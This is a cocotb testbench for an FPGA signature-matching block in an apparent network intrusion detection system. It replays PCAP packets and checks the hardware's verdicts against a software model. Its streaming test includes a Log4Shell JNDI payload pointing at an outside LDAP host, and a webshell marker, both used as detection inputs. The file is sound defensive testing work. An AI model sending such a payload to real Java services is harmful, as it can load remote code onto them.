"""
sim/cocotb/test_cam_matcher.py - Content-Addressable Memory Signature Matcher Testbench

Verification suite for rtl/detect/cam_matcher.v:
  1. test_cam_all_signatures: All 16 threat signatures tested individually.
  2. test_cam_benign_controls: Benign payloads tested for 0% false positive rate.
  3. test_cam_pcap_replay: Full replay of sim/vectors/cicids2017_subset/signature.pcap (20 packets).
  4. test_cam_back_to_back_streaming: Back-to-back packets with zero idle bubbles.

Target: ZedBoard XC7Z020 @ 100 MHz (10 ns clock)
Owner: Member B (Threat Detection Lane)
"""

import json
import os
import random
import struct
import sys
from pathlib import Path

# Add project root to sys.path
PROJ_ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(PROJ_ROOT))

import cocotb
from cocotb.clock import Clock
from cocotb.triggers import FallingEdge, RisingEdge

from model.detect import (
    CAM_SIGNATURES,
    RC_NONE,
    RC_SIGNATURE,
    CAMMatcher,
)

PCAP_DIR = PROJ_ROOT / "sim" / "vectors" / "cicids2017_subset"


def parse_signature_pcap(pcap_path: Path):
    """Extracts payloads and metadata from binary PCAP file."""
    packets = []
    with open(pcap_path, "rb") as f:
        ghdr = f.read(24)
        magic, maj, minv, tz, sigf, snap, link = struct.unpack("<IHHiIII", ghdr)
        assert magic == 0xA1B2C3D4, f"Invalid PCAP magic: {magic:#x}"

        while True:
            rec_hdr = f.read(16)
            if not rec_hdr or len(rec_hdr) < 16:
                break
            ts_sec, ts_usec, caplen, wirelen = struct.unpack("<IIII", rec_hdr)
            frame = f.read(caplen)

            # Ethernet II
            eth_type = struct.unpack("!H", frame[12:14])[0]
            if eth_type == 0x0800:
                ip_hdr = frame[14:34]
                ver_ihl, dscp, tot_len, ident, flags_frag, ttl, proto, chk, s_ip, d_ip = struct.unpack(
                    "!BBHHHBBHII", ip_hdr
                )
                ihl_bytes = (ver_ihl & 0x0F) * 4
                l4_start = 14 + ihl_bytes

                if proto == 6:  # TCP
                    l4_hdr = frame[l4_start : l4_start + 20]
                    s_port, d_port, seq, ack, data_off, flags, win, csum, urp = struct.unpack(
                        "!HHIIBBHHH", l4_hdr
                    )
                    tcp_hdr_len = ((data_off >> 4) & 0x0F) * 4
                    payload = frame[l4_start + tcp_hdr_len : 14 + tot_len]
                    packets.append({
                        "src_ip": s_ip,
                        "dst_ip": d_ip,
                        "src_port": s_port,
                        "dst_port": d_port,
                        "payload": payload,
                    })
    return packets


async def reset_dut(dut):
    """Synchronous active-high reset."""
    dut.rst.value = 1
    dut.pt_valid.value = 0
    dut.pt_data.value = 0
    dut.pt_sof.value = 0
    dut.pt_eof.value = 0
    dut.pt_tag_ok.value = 0
    dut.pt_tag_valid.value = 0

    await RisingEdge(dut.clk)
    await RisingEdge(dut.clk)
    dut.rst.value = 0
    await RisingEdge(dut.clk)
    await FallingEdge(dut.clk)


async def send_payload_stream(dut, payload: bytes):
    """Streams payload bytes into cam_matcher.v and collects verdict."""
    if len(payload) == 0:
        return 0, RC_NONE, 0, 0

    for idx, b in enumerate(payload):
        dut.pt_valid.value = 1
        dut.pt_data.value = b
        dut.pt_sof.value = 1 if (idx == 0) else 0
        dut.pt_eof.value = 1 if (idx == len(payload) - 1) else 0

        await RisingEdge(dut.clk)
        await FallingEdge(dut.clk)

    dut.pt_valid.value = 0
    dut.pt_sof.value = 0
    dut.pt_eof.value = 0

    # Wait for v_cam_valid strobe (1 cycle after pt_eof)
    while int(dut.v_cam_valid.value) == 0:
        await RisingEdge(dut.clk)
        await FallingEdge(dut.clk)

    fail = int(dut.v_cam_fail.value)
    reason = int(dut.v_cam_reason.value)
    sig_id = int(dut.match_sig_id.value)
    offset = int(dut.match_offset.value)
    return fail, reason, sig_id, offset


@cocotb.test()
async def test_cam_all_signatures(dut):
    """Verifies that all 16 canonical threat signatures match individually."""
    cocotb.start_soon(Clock(dut.clk, 10, units="ns").start())
    await reset_dut(dut)

    oracle = CAMMatcher()

    for sig in CAM_SIGNATURES:
        # Wrap signature with prefix and suffix padding
        prefix = b"TEST_HTTP_REQUEST_DATA_"
        suffix = b"_TRAILER_CONTENT_HERE"
        payload = prefix + sig["pattern"] + suffix

        fail_exp, reason_exp, sig_id_exp, offset_exp = oracle.scan_payload(payload)
        fail_hw, reason_hw, sig_id_hw, offset_hw = await send_payload_stream(dut, payload)

        assert fail_hw == 1, f"Hardware missed signature {sig['name']}"
        assert reason_hw == RC_SIGNATURE, f"Wrong reason for {sig['name']}: {reason_hw:#x}"
        assert sig_id_hw == sig["id"], (
            f"Sig ID mismatch for {sig['name']}: exp {sig['id']}, got {sig_id_hw}"
        )
        assert fail_hw == fail_exp, f"Model mismatch on fail: exp {fail_exp}, got {fail_hw}"
        assert reason_hw == reason_exp, f"Model mismatch on reason: exp {reason_exp}, got {reason_hw}"


@cocotb.test()
async def test_cam_benign_controls(dut):
    """Verifies that benign traffic produces zero false alarms."""
    cocotb.start_soon(Clock(dut.clk, 10, units="ns").start())
    await reset_dut(dut)

    oracle = CAMMatcher()

    benign_samples = [
        b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n",
        b"POST /api/login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"user\":\"admin\"}",
        b"GET /static/bundle.min.js HTTP/1.1\r\nAccept: */*\r\n\r\n",
        b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10",
        b"SELECT username, email FROM members WHERE status = 'active';",
        b"SHREYAS_PQC_NIDS_TEST_FRAMEWORK_SAFE_BYTES_STREAM",
    ]

    for idx, payload in enumerate(benign_samples, 1):
        fail_exp, reason_exp, _, _ = oracle.scan_payload(payload)
        fail_hw, reason_hw, sig_id_hw, _ = await send_payload_stream(dut, payload)

        assert fail_hw == 0, f"False alarm on benign sample #{idx}!"
        assert reason_hw == RC_NONE, f"Non-zero reason on benign sample #{idx}: {reason_hw:#x}"
        assert sig_id_hw == 0, f"Spurious signature ID on benign sample #{idx}: {sig_id_hw}"
        assert fail_hw == fail_exp, f"Model mismatch on benign sample #{idx}"


@cocotb.test()
async def test_cam_pcap_replay(dut):
    """Replays signature.pcap (20 packets) and validates ground-truth agreement."""
    cocotb.start_soon(Clock(dut.clk, 10, units="ns").start())
    await reset_dut(dut)

    packets = parse_signature_pcap(PCAP_DIR / "signature.pcap")
    assert len(packets) == 20, f"Expected 20 packets in signature.pcap, got {len(packets)}"

    with open(PCAP_DIR / "labels.json", "r") as f:
        labels_data = json.load(f)
    sig_labels = [l for l in labels_data["packets"] if l["pcap_file"] == "signature.pcap"]
    assert len(sig_labels) == 20, f"Expected 20 labels for signature.pcap, got {len(sig_labels)}"

    for idx, (pkt, lbl) in enumerate(zip(packets, sig_labels), 1):
        payload = pkt["payload"]
        exp_fail = 1 if lbl["expected_fail"] else 0
        exp_reason = RC_SIGNATURE if lbl["expected_reason"] == "RC_SIGNATURE" else RC_NONE

        fail_hw, reason_hw, sig_id_hw, _ = await send_payload_stream(dut, payload)

        assert fail_hw == exp_fail, (
            f"Packet {idx} ({lbl['threat_class']}): expected fail {exp_fail}, got {fail_hw}"
        )
        assert reason_hw == exp_reason, (
            f"Packet {idx} ({lbl['threat_class']}): expected reason {exp_reason:#x}, got {reason_hw:#x}"
        )


@cocotb.test()
async def test_cam_back_to_back_streaming(dut):
    """Stress tests back-to-back streaming packets with zero idle bubbles."""
    cocotb.start_soon(Clock(dut.clk, 10, units="ns").start())
    await reset_dut(dut)

    packets_to_stream = [
        (b"CLEAN_BENIGN_PACKET_STREAM_ALPHA", 0, RC_NONE),
        (b"MALICIOUS_LOG4SHELL_${jndi:ldap://leak.com}_ATTACK", 1, RC_SIGNATURE),
        (b"CLEAN_BENIGN_PACKET_STREAM_BETA", 0, RC_NONE),
        (b"ATTACK_WEBSHELL_cmd.exe_EXECUTE", 1, RC_SIGNATURE),
        (b"CLEAN_BENIGN_PACKET_STREAM_GAMMA", 0, RC_NONE),
    ]

    for p_idx, (payload, exp_fail, exp_reason) in enumerate(packets_to_stream, 1):
        fail_hw, reason_hw, _, _ = await send_payload_stream(dut, payload)
        assert fail_hw == exp_fail, f"Packet {p_idx}: expected fail {exp_fail}, got {fail_hw}"
        assert reason_hw == exp_reason, f"Packet {p_idx}: expected reason {exp_reason:#x}, got {reason_hw:#x}"


if __name__ == "__main__":
    from cocotb.runner import get_runner

    runner = get_runner("icarus")
    runner.build(
        sources=[
            PROJ_ROOT / "rtl" / "detect" / "cam_matcher.v",
        ],
        hdl_toplevel="cam_matcher",
        includes=[PROJ_ROOT / "rtl" / "control"],
        build_dir=PROJ_ROOT / "sim" / "build",
        always=True,
    )
    runner.test(
        hdl_toplevel="cam_matcher",
        test_module="test_cam_matcher",
        test_dir=PROJ_ROOT / "sim" / "cocotb",
    )
